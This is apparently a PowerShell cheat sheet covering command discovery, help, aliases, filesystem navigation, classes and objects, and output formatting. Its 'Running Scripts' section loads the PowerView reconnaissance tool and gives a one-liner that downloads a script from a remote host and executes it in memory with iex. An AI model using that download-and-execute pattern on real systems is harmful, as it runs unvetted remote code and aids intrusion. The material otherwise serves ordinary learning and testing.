## Basics
* Search Commands
	```powershell
	#list all powershell cmdlets, functions and alias
	Get-Command
	
	#search ommands that starts with get
	Get-Command get*
	
	#search commands that ends with object
	Get-Command *object
	
	#search command for a verb
	Get-Command -Verb Get
	
	#search command for a noun
	Get-Command -Noun Object
	
	```
* Help
	```powershell
	#get help for the command New-Object
	Get-Help New-Object
	
	#List Examples for New-Object
	Get-Help New-Object -Example
	
	#get detailed help for New-Object 
	Get-Help New-Object -Detailed
	
	#get online help for the command
	Get-Help New-Object -Online
	```
* Alias
	```powershell
	# Print all alias
	Get-Alias
	
	#search alias
	Get-Alias search_term
	```
* Variables
	```powershell
	#Storging values/object/data in variable
	$myobj = Get-Childitem
	$myobj = Get-Location
	$myobj = "Doctor Dragon"
	```
## Filesystem
* Filesystem Navigation
	```powershell
	#list files and directories; ls
	Get-Childitem
	
	#change directory; cd
	Set-Location
	
	#print current working directory; pwd
	Get-Location
	
	#print content of the file; cat
	Get-Content filename
	```
## Classes and Objects
* Creating a Class in Powershell
	```powershell
	class human{
		[string]$name
		[int]$age
		[string]greet(){
			return "$($this.name) is $($this.age) years old"
		}
	}
	```
* Creating objects from a class
	```powershell
	# creating instance of a class using accelerator
	$drdragon = [human]::new() 
	$myname = [System.String]::new("Hello World")
	
	# creating a instance of a class using cmdlet
	$drdragon = New-Object -TypeName human
	$myname = New-Object System.String("Hello World")
	```
* List Properties and Methods of Objects
	```powershell
	# get properties and methods for the object
	$myobj | Get-Member
	Get-Childitem | Get-Member
	```
* Accessing Properties and methods of object
	```powershell
	# Acess property for the object
	$myobj.Length
	(New-Object System.String("drdragon")).Length
	
	# execute methods for the object
	$myobj.Remove(1)
	(New-Object System.String("drdragon")).Remove(1)
	```
* Selecting Objects
	```powershell
	# print specific property of an object
	Get-Childitem | Select-Object -Property Name,Parent
	$myobj | Select-Object -Property Name
	
	# print all property of an object
	$myobject | Select-Object -Property *

	# Alisas for Select-Ojbect
	Get-ChildItem | select Name, Parent
	```
* Filtering Objects
	```powershell
	# filter output if object's Name property is equal to "etc"
	Get-Childitem | Where-Object {$_.Name -eq "etc"}
	```
## Format Object
* Format-List
	```powershell
	# Prints Properties of an object in a key-value pair format
	Get-Childitem | Format-List
	
	# Prints secific property
	Get-Childitem | Format-List -Property Name,Parent
	```
* Format-Table
	```powershell
	# Default way of printing objects
	# Prints properties of object in a table format
	Get-Childitem | Format-Table
	
	# Prints secific property
	Get-Childitem | Format-Table -Property Name,Parent
	```
## Running Scripts
- Local Scripts
```powershell
# dot source
. .\Tools\Powerview.ps1

# Using cmdlet
Import-Module C:\Tools\Powerview.ps1

# Get commands imported by a module
Get-Command -Module <ModuleName>

```
- Remote Scripts
```powershell
iex (New-Ojbect Net.webClient).DownloadString('https://server.com/powerview.ps1')
```

# Language Mode
```powershell
# Check current powershell session language mode
$ExecutionContext.SessionState.LanguageMode
```